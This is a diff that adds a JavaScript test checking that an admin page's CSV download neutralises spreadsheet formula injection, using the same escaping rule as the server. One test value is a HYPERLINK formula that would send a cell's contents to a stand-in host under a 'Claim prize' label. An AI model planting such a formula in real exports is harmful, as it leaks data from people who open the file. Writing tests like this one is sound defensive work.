@@ -136,3 +136,28 @@ test('admin.html loads js/admin.js and has the ids and data attributes it binds'
     for (const id of IDS) assert.ok(html.includes(`id="${id}"`), `admin.html is missing #${id}`);
     for (const [m, p] of PRIZE) assert.ok(html.includes(`data-prize-mode="${m}" data-prize-period="${p}"`));
 });
+
+test('DOWNLOAD CSV neutralises formula cells with the same R20 rule as the server export', async () => {
+    const { csvEscape: serverCsvEscape } = await import('../../backend/handlers/admin.mjs');
+    const evil = '=HYPERLINK("http://x/?"&B2,"Claim prize")';
+    const players = [
+        { playerName: '+cmd', email: '@a@x.ie', company: evil, registeredAt: '-1', marketingConsent: false },
+        { playerName: '\tTab', email: 'b@x.ie', company: '\rCR', registeredAt: 123, marketingConsent: true }
+    ];
+    const doc = page();
+    const e = env({ stored: 'kept' });
+    const realFetch = e.fetch;
+    e.fetch = async (url, opts) => (url.startsWith('/api/admin/players')
+        ? { ok: true, status: 200, json: async () => ({ players }) }
+        : realFetch(url, opts));
+    const admin = initAdmin({ document: doc, ...e });
+    await admin.ready;
+    doc.getElementById('btn-download-csv').click();
+    const lines = e.saved[0].split('\r\n');
+    assert.ok(lines[1].includes(`"'=HYPERLINK(""http://x/?""&B2,""Claim prize"")"`), lines[1]);
+    assert.ok(!/(^|,)"[=+\-@\t\r]/.test(e.saved[0].split('\r\n').slice(1).join('\n')), 'no cell starts with a formula character');
+    // Pinned to the server rule: every row is exactly what backend/handlers/admin.mjs csvEscape would produce.
+    const expected = players.map(p => [p.playerName, p.email, p.company, p.registeredAt, p.marketingConsent ? 'Yes' : 'No']
+        .map(serverCsvEscape).join(','));
+    assert.deepEqual(e.saved[0].split('\r\n').slice(1), expected);
+});
